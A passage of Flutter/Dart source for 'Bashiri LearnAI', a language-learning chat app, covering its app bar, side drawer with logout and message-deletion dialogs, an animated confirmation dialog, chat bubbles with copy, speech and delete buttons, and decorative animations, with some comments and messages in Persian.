      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error deleting message: $e')),
      );
    } finally {
      if (mounted) {
        setState(() {
          _isDeleting = false;
        });
      }
    }
  }

  Widget _buildAppBar({
    required double screenWidth,
    required double baseFontSize,
    required double baseIconSize,
    required double basePadding,
    required double baseBorderRadius,
  }) {
    return Container(
      padding: EdgeInsets.symmetric(
          vertical: basePadding * 0.8, horizontal: basePadding),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [Color(0xFFD8B5FF), Color(0xFF8EC5FC)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius:
        BorderRadius.vertical(bottom: Radius.circular(baseBorderRadius)),
      ),
      child: Builder(
        builder: (BuildContext appBarContext) {
          return Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  IconButton(
                    icon: Icon(Icons.menu,
                        color: Colors.white, size: baseIconSize * 0.8),
                    onPressed: () {
                      Scaffold.of(appBarContext).openDrawer();
                    },
                  ),
                  SizedBox(width: basePadding * 0.5),
                  Text(
                    'Bashiri LearnAI',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: baseFontSize * 1.2,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ],
          );
        },
      ),
    );
  }

  Widget _buildDrawer({
    required double screenWidth,
    required double baseFontSize,
    required double baseIconSize,
    required double basePadding,
    required double baseBorderRadius,
  }) {
    return Drawer(
      child: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [Color(0xFF2A1B3D), Color(0xFF44318D)],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
        ),
        child: ListView(
          padding: EdgeInsets.zero,
          children: [
            DrawerHeader(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [Color(0xFFD8B5FF), Color(0xFF8EC5FC)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  CircleAvatar(
                    radius: baseIconSize * 1.1,
                    backgroundColor: Colors.white.withOpacity(0.3),
                    child: Icon(
                      Icons.person,
                      size: baseIconSize * 1.4,
                      color: Colors.white,
                    ),
                  ),
                  SizedBox(height: basePadding * 0.8),
                  Text(
                    _userName.isNotEmpty ? _userName : 'Bashiri Student',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: baseFontSize * 1.1,
                      fontWeight: FontWeight.bold,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                ],
              ),
            ),
            _buildDrawerItem(
              icon: Icons.settings,
              title: 'Setting',
              onTap: () {
                Navigator.pop(context);
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(content: Text('Setting page is not ready for now!')),
                );
              },
              baseFontSize: baseFontSize,
              baseIconSize: baseIconSize,
              basePadding: basePadding,
            ),
            _buildDrawerItem(
              icon: Icons.info_outline,
              title: 'About Us',
              onTap: () {
                print('Opening About Us dialog');
                Navigator.pop(context);
                showDialog(
                  context: context,
                  barrierColor: Colors.black54,
                  builder: (dialogContext) {
                    print('Dialog opened');
                    return AlertDialog(
                      title: Text('About Bashiri LearnAI'),
                      content: Text(
                        'Bashiri LearnAI is a language learning assistant from Bashiri Academy, designed by Mr.Haroon Shirzad. We help you learn English with joy! 😊',
                      ),
                      actions: [
                        TextButton(
                          onPressed: () {
                            print('Closing dialog');
                            Navigator.pop(dialogContext);
                          },
                          child: Text('Close'),
                        ),
                      ],
                    );
                  },
                );
              },
              baseFontSize: baseFontSize,
              baseIconSize: baseIconSize,
              basePadding: basePadding,
            ),
            _buildDrawerItem(
              icon: Icons.delete_sweep,
              title: 'Delete Messages',
              onTap: () {
                Navigator.pop(context);
                showDialog(
                  context: context,
                  builder: (context) => CustomConfirmationDialog(
                    title: 'Delete Messages',
                    message: 'Do you want to delete messages? ',
                    confirmText: 'Delete',
                    cancelText: 'Cancel',
                    onConfirm: () async {
                      await _dbHelper.clearMessages(_currentStudentId);
                      if (mounted) {
                        setState(() {
                          _messages.clear();
                          _addInitialMessages();
                        });
                      }
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                            content: Text('Messages delete successfully✅')),
                      );
                    },
                    baseFontSize: baseFontSize,
                    baseIconSize: baseIconSize,
                    basePadding: basePadding,
                    baseBorderRadius: baseBorderRadius,
                  ),
                );
              },
              baseFontSize: baseFontSize,
              baseIconSize: baseIconSize,
              basePadding: basePadding,
            ),
            _buildDrawerItem(
              icon: Icons.logout,
              title: 'Log out',
              onTap: () {
                Navigator.pop(context);
                showDialog(
                  context: context,
                  builder: (context) => CustomConfirmationDialog(
                    title: 'log out ',
                    message: 'Do you want to exit from your account',
                    confirmText: 'Exit',
                    cancelText: 'Cancel',
                    onConfirm: () async {
                      try {
                        print(
                            'شروع لاگ‌اوت برای کاربر: ${FirebaseAuth.instance.currentUser?.uid}');
                        await FirebaseAuth.instance.signOut();
                        print('لاگ‌اوت موفق');
                        Navigator.of(context).pushAndRemoveUntil(
                          MaterialPageRoute(
                              builder: (context) => LoginScreen()),
                              (Route<dynamic> route) => false,
                        );
                      } catch (e) {
                        print('خطا توی لاگ‌اوت: $e');
                        ScaffoldMessenger.of(context).showSnackBar(
                          SnackBar(
                              content: Text(
                                  'خطا در خروج: لطفاً دوباره امتحان کنید.')),
                        );
                      }
                    },
                    baseFontSize: baseFontSize,
                    baseIconSize: baseIconSize,
                    basePadding: basePadding,
                    baseBorderRadius: baseBorderRadius,
                  ),
                );
              },
              baseFontSize: baseFontSize,
              baseIconSize: baseIconSize,
              basePadding: basePadding,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDrawerItem({
    required IconData icon,
    required String title,
    required VoidCallback onTap,
    required double baseFontSize,
    required double baseIconSize,
    required double basePadding,
  }) {
    return ListTile(
      leading: Icon(
        icon,
        color: Colors.white,
        size: baseIconSize * 0.8,
      ),
      title: Text(
        title,
        style: TextStyle(
          color: Colors.white,
          fontSize: baseFontSize,
          fontWeight: FontWeight.w600,
        ),
      ),
      onTap: onTap,
      contentPadding: EdgeInsets.symmetric(
          horizontal: basePadding, vertical: basePadding * 0.2),
      tileColor: Colors.transparent,
      hoverColor: Colors.white.withOpacity(0.1),
    );
  }

  Widget _buildInputArea({
    required double screenWidth,
    required double baseFontSize,
    required double baseIconSize,
    required double basePadding,
    required double baseBorderRadius,
    required bool isLandscape,
  }) {
    return Container(
      padding: EdgeInsets.symmetric(
          horizontal: basePadding, vertical: basePadding * 0.8),
      child: Row(
        children: [
          Expanded(
            child: TextField(
              controller: _controller,
              style: TextStyle(color: Colors.white, fontSize: baseFontSize),
              decoration: InputDecoration(
                hintText: 'Write here...',
                hintStyle: TextStyle(
                    color: Colors.white60, fontSize: baseFontSize * 0.9),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(baseBorderRadius * 0.8),
                ),
              ),
              textDirection: _currentTextDirection,
            ),
          ),
          SizedBox(width: basePadding * 0.5),
          GestureDetector(
            onTap: () {
              _pickAndSendImage();
            },
            child: Container(
              padding: EdgeInsets.all(basePadding * 0.7),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                    colors: [Color(0xFFD8B5FF), Color(0xFF8EC5FC)]),
              ),
              child: Icon(Icons.image,
                  color: Colors.white, size: baseIconSize * 0.7),
            ),
          ),
          SizedBox(width: basePadding * 0.5),
          GestureDetector(
            onTap: _sendMessage,
            child: Container(
              padding: EdgeInsets.all(basePadding * 0.7),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                    colors: [Color(0xFFD8B5FF), Color(0xFF8EC5FC)]),
              ),
              child: Icon(Icons.send,
                  color: Colors.white, size: baseIconSize * 0.7),
            ),
          ),
        ],
      ),
    );
  }
}

// ویجت جدید برای دیالوگ کاستوم با انیمیشن
class CustomConfirmationDialog extends StatefulWidget {
  final String title;
  final String message;
  final String confirmText;
  final String? cancelText;
  final VoidCallback onConfirm;
  final bool showCancel;
  final double baseFontSize;
  final double baseIconSize;
  final double basePadding;
  final double baseBorderRadius;

  CustomConfirmationDialog({
    required this.title,
    required this.message,
    required this.confirmText,
    this.cancelText,
    required this.onConfirm,
    this.showCancel = true,
    required this.baseFontSize,
    required this.baseIconSize,
    required this.basePadding,
    required this.baseBorderRadius,
  });

  @override
  _CustomConfirmationDialogState createState() =>
      _CustomConfirmationDialogState();
}

class _CustomConfirmationDialogState extends State<CustomConfirmationDialog>
    with SingleTickerProviderStateMixin {
  late AnimationController _dialogController;
  late Animation<double> _scaleAnimation;
  late Animation<double> _fadeAnimation;

  @override
  void initState() {
    super.initState();
    _dialogController = AnimationController(
      vsync: this,
      duration: Duration(milliseconds: 400),
    );
    _scaleAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _dialogController, curve: Curves.easeOutBack),
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _dialogController, curve: Curves.easeIn),
    );
    _dialogController.forward();
  }

  @override
  void dispose() {
    _dialogController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Dialog(
      backgroundColor: Colors.transparent,
      child: Stack(
        alignment: Alignment.center,
        children: [
          // افکت پس‌زمینه با گلو
          AnimatedBuilder(
            animation: _dialogController,
            builder: (context, child) {
              return Container(
                width: 300 + (_dialogController.value * 20),
                height: 200 + (_dialogController.value * 20),
                decoration: BoxDecoration(
                  shape: BoxShape.rectangle,
                  gradient: RadialGradient(
                    colors: [
                      Color(0xFFD8B5FF).withOpacity(0.3 * _fadeAnimation.value),
                      Color(0xFF8EC5FC).withOpacity(0.2 * _fadeAnimation.value),
                    ],
                  ),
                ),
              );
            },
          ),
          // محتوای دیالوگ
          ScaleTransition(
            scale: _scaleAnimation,
            child: FadeTransition(
              opacity: _fadeAnimation,
              child: Container(
                width: 300,
                padding: EdgeInsets.all(widget.basePadding * 1.5),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Color(0xFF2A1B3D), Color(0xFF44318D)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(widget.baseBorderRadius),
                  border: Border.all(
                    color: Color(0xFFD8B5FF).withOpacity(0.5),
                    width: 1.5,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: Color(0xFF8EC5FC).withOpacity(0.5),
                      blurRadius: 15,
                      spreadRadius: 3,
                    ),
                  ],
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text(
                      widget.title,
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: widget.baseFontSize * 1.2,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    SizedBox(height: widget.basePadding),
                    Text(
                      widget.message,
                      style: TextStyle(
                        color: Colors.white70,
                        fontSize: widget.baseFontSize * 0.9,
                      ),
                      textAlign: TextAlign.center,
                    ),
                    SizedBox(height: widget.basePadding * 1.5),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        if (widget.showCancel) ...[
                          _buildDialogButton(
                            text: widget.cancelText ?? 'لغو',
                            gradientColors: [
                              Color(0xFFFF6B6B),
                              Color(0xFFD8B5FF)
                            ],
                            onTap: () => Navigator.pop(context),
                          ),
                          SizedBox(width: widget.basePadding),
                        ],
                        _buildDialogButton(
                          text: widget.confirmText,
                          gradientColors: [
                            Color(0xFFD8B5FF),
                            Color(0xFF8EC5FC)
                          ],
                          onTap: () {
                            widget.onConfirm();
                            Navigator.pop(context);
                          },
                          isConfirm: true,
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDialogButton({
    required String text,
    required List<Color> gradientColors,
    required VoidCallback onTap,
    bool isConfirm = false,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedBuilder(
        animation: _dialogController,
        builder: (context, child) {
          return MouseRegion(
            onEnter: (_) => setState(() {}),
            onExit: (_) => setState(() {}),
            child: Container(
              padding: EdgeInsets.symmetric(
                vertical: widget.basePadding * 0.8,
                horizontal: widget.basePadding * 1.5,
              ),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: gradientColors,
                ),
                borderRadius:
                BorderRadius.circular(widget.baseBorderRadius * 0.7),
                boxShadow: [
                  BoxShadow(
                    color: gradientColors[0].withOpacity(isConfirm ? 0.7 : 0.5),
                    blurRadius:
                    isConfirm ? 10 + _dialogController.value * 5 : 8,
                    spreadRadius: isConfirm ? 3 : 2,
                  ),
                ],
              ),
              child: Text(
                text,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: widget.baseFontSize * 0.9,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          );
        },
      ),
    );
  }
}

class ChatBubble extends StatefulWidget {
  final String? text;
  final String? imagePath;
  final bool isMe;
  final DateTime time;
  final String id;
  final FlutterTts flutterTts;
  final String? currentlyPlayingMessageId;
  final Function(String, bool) onPlayStateChanged;
  final VoidCallback? retryCallback;
  final VoidCallback? onDelete;
  final double baseFontSize;
  final double baseIconSize;
  final double basePadding;
  final double baseBorderRadius;

  ChatBubble({
    Key? key,
    required this.text,
    required this.imagePath,
    required this.isMe,
    required this.time,
    required this.id,
    required this.flutterTts,
    required this.currentlyPlayingMessageId,
    required this.onPlayStateChanged,
    this.retryCallback,
    this.onDelete,
    required this.baseFontSize,
    required this.baseIconSize,
    required this.basePadding,
    required this.baseBorderRadius,
  }) : super(key: key);

  @override
  _ChatBubbleState createState() => _ChatBubbleState();
}

class _ChatBubbleState extends State<ChatBubble>
    with SingleTickerProviderStateMixin {
  late AnimationController _bubbleController;
  bool _isHoveredDelete = false;
  bool _isHoveredCopy = false;
  bool _isPlaying = false;
  bool _isVisible = true;

  @override
  void initState() {
    super.initState();
    _bubbleController = AnimationController(
      vsync: this,
      duration: Duration(seconds: 2),
    )..repeat(reverse: true);
    _isPlaying = widget.currentlyPlayingMessageId == widget.id;
  }

  Future<void> _deleteMessage() async {
    if (_isVisible) {
      setState(() {
        _isVisible = false; // شروع انیمیشن محو شدن
      });
      // صبر برای اتمام انیمیشن (500 میلی‌ثانیه)
      await Future.delayed(Duration(milliseconds: 500));
      if (mounted && widget.onDelete != null) {
        widget.onDelete!(); // حذف واقعی پیام
      }
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Message deleted')),
        );
      }
    }
  }

  bool _isTextPersian(String text) {
    final persianRegex = RegExp(r'[\u0600-\u06FF]');
    return persianRegex.hasMatch(text);
  }

  Future<void> _togglePlay() async {
    if (_isPlaying) {
      await widget.flutterTts.stop();
      if (mounted) {
        setState(() {
          _isPlaying = false;
        });
      }
      widget.onPlayStateChanged(widget.id, false);
    } else {
      if (widget.currentlyPlayingMessageId != null) {
        await widget.flutterTts.stop();
      }
      bool isPersian = _isTextPersian(widget.text!);
      if (!isPersian) {
        await widget.flutterTts.setLanguage("en-US");
        if (mounted) {
          setState(() {
            _isPlaying = true;
          });
        }
        widget.onPlayStateChanged(widget.id, true);
        await widget.flutterTts.speak(widget.text!);
      } else {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text('Persian text cannot be read on this device.')),
        );
      }
    }
  }

  void _copyText() {
    Clipboard.setData(ClipboardData(text: widget.text!));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Text copied!')),
    );
  }

  @override
  void didUpdateWidget(ChatBubble oldWidget) {
    super.didUpdateWidget(oldWidget);
    bool newIsPlaying = widget.currentlyPlayingMessageId == widget.id;
    if (_isPlaying != newIsPlaying && mounted) {
      setState(() {
        _isPlaying = newIsPlaying;
      });
    }
  }

  @override
  void dispose() {
    _bubbleController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    TextDirection bubbleDirection =
    widget.text != null && _isTextPersian(widget.text!)
        ? TextDirection.rtl
        : TextDirection.ltr;
    return AnimatedOpacity(
      opacity: _isVisible ? 1.0 : 0.0,
      duration: Duration(milliseconds: 500), // مدت زمان انیمیشن محو شدن
      child: Directionality(
        textDirection: bubbleDirection,
        child: Column(
          crossAxisAlignment:
          widget.isMe ? CrossAxisAlignment.end : CrossAxisAlignment.start,
          children: [
            Container(
              margin: EdgeInsets.symmetric(vertical: widget.basePadding * 0.5),
              padding: EdgeInsets.all(widget.basePadding),
              constraints: BoxConstraints(
                  maxWidth: MediaQuery.of(context).size.width * 0.75),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: widget.isMe
                      ? [Color(0xFFD8B5FF), Color(0xFF8EC5FC)]
                      : [Color(0xFF44318D), Color(0xFF2A1B3D)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(widget.baseBorderRadius),
              ),
              child: Column(
                crossAxisAlignment: widget.isMe
                    ? CrossAxisAlignment.end
                    : CrossAxisAlignment.start,
                children: [
                  if (widget.imagePath != null)
                    ClipRRect(
                      borderRadius:
                      BorderRadius.circular(widget.baseBorderRadius * 0.5),
                      child: Image.file(
                        File(widget.imagePath!),
                        width: MediaQuery.of(context).size.width * 0.5,
                        height: MediaQuery.of(context).size.width * 0.5,
                        fit: BoxFit.cover,
                      ),
                    ),
                  if (widget.text != null && widget.imagePath != null)
                    SizedBox(height: widget.basePadding * 0.5),
                  if (widget.text != null)
                    Text(
                      widget.text!,
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: widget.baseFontSize,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                  SizedBox(height: widget.basePadding * 0.45),
                  Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(
                        '${widget.time.hour}:${widget.time.minute}',
                        style: TextStyle(
                            color: Colors.white70,
                            fontSize: widget.baseFontSize * 0.7),
                      ),
                      if (widget.retryCallback != null)
                        SizedBox(width: widget.basePadding * 0.5),
                      if (widget.retryCallback != null)
                        GestureDetector(
                          onTap: widget.retryCallback,
                          child: Container(
                            padding: EdgeInsets.all(widget.basePadding * 0.3),
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: Colors.white.withOpacity(0.2),
                            ),
                            child: Icon(
                              Icons.refresh,
                              color: Colors.white,
                              size: widget.baseIconSize * 0.6,
                            ),
                          ),
                        ),
                    ],
                  ),
                ],
              ),
            ),
            Padding(
              padding: EdgeInsets.only(
                left: widget.isMe ? 0 : widget.basePadding,
                right: widget.isMe ? widget.basePadding : 0,
                top: widget.basePadding * 0.3,
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  MouseRegion(
                    onEnter: (_) => setState(() => _isHoveredCopy = true),
                    onExit: (_) => setState(() => _isHoveredCopy = false),
                    child: GestureDetector(
                      onTap: _copyText,
                      child: AnimatedContainer(
                        duration: Duration(milliseconds: 300),
                        padding: EdgeInsets.all(widget.basePadding * 0.2),
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              Color(0xFF8EC5FC),
                              Color(0xFFD8B5FF).withOpacity(0.7)
                            ],
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: Color(0xFF8EC5FC)
                                  .withOpacity(_isHoveredCopy ? 0.7 : 0.5),
                              blurRadius: _isHoveredCopy
                                  ? widget.basePadding * 0.5
                                  : widget.basePadding * 0.25,
                            ),
                          ],
                        ),
                        child: Icon(
                          Icons.copy,
                          color: Colors.white,
                          size: widget.baseIconSize * 0.6,
                        ),
                      ),
                    ),
                  ),
                  SizedBox(width: widget.basePadding * 0.3),
                  if (!widget.isMe && widget.text != null)
                    GestureDetector(
                      onTap: _togglePlay,
                      child: AnimatedContainer(
                        duration: Duration(milliseconds: 300),
                        padding: EdgeInsets.all(widget.basePadding * 0.2),
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              Color(0xFF00C4B4),
                              Color(0xFFD8B5FF).withOpacity(0.7)
                            ],
                          ),
                        ),
                        child: Icon(
                          _isPlaying ? Icons.pause : Icons.play_arrow,
                          color: Colors.white,
                          size: widget.baseIconSize * 0.6,
                        ),
                      ),
                    ),
                  if (!widget.isMe && widget.text != null)
                    SizedBox(width: widget.basePadding * 0.3),
                  MouseRegion(
                    onEnter: (_) => setState(() => _isHoveredDelete = true),
                    onExit: (_) => setState(() => _isHoveredDelete = false),
                    child: GestureDetector(
                      onTap: _deleteMessage,
                      child: AnimatedContainer(
                        duration: Duration(milliseconds: 300),
                        padding: EdgeInsets.all(widget.basePadding * 0.2),
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              Color(0xFFFF6B6B),
                              Color(0xFFD8B5FF).withOpacity(0.7)
                            ],
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: Color(0xFFFF6B6B)
                                  .withOpacity(_isHoveredDelete ? 0.7 : 0.5),
                              blurRadius: _isHoveredDelete
                                  ? widget.basePadding * 0.5
                                  : widget.basePadding * 0.25,
                            ),
                          ],
                        ),
                        child: Icon(
                          Icons.delete,
                          color: Colors.white,
                          size: widget.baseIconSize * 0.6,
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class TypingIndicator extends StatelessWidget {
  final AnimationController controller;

  const TypingIndicator({Key? key, required this.controller}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    print('TypingIndicator build: controller status=${controller.status}');
    return AnimatedBuilder(
      animation: controller,
      builder: (context, child) {
        // محاسبه مقادیر انیمیشن برای هر توپک
        double dot1 = (controller.value + 0.0) % 1.0;
        double dot2 = (controller.value + 0.33) % 1.0;
        double dot3 = (controller.value + 0.66) % 1.0;

        return Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            _buildDot(dot1),
            const SizedBox(width: 8),
            _buildDot(dot2),
            const SizedBox(width: 8),
            _buildDot(dot3),
          ],
        );
      },
    );
  }

  Widget _buildDot(double value) {
    // استفاده از sin از کتابخونه dart:math
    double offset = (0.5 - (0.5 * sin(2 * pi * value))).clamp(0.0, 1.0);
    return Transform.translate(
      offset: Offset(0, -offset * 8),
      child: Container(
        width: 12,
        height: 12,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: const Color(0xFF8EC5FC).withOpacity(0.7),
        ),
      ),
    );
  }
}

class CrystalParticlePainter extends CustomPainter {
  final double animationValue;
  CrystalParticlePainter(this.animationValue);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Color(0xFFD8B5FF).withOpacity(0.3);
    const int particleCount = 10;
    for (int i = 0; i < particleCount; i++) {
      final x = (size.width * (i / particleCount)) +
          (sin(animationValue * pi + i) * 15);
      final y = (size.height * (i / particleCount)) +
          (cos(animationValue * pi + i) * 15);
      final scale = 2.0;
      canvas.drawCircle(Offset(x, y), scale, paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}
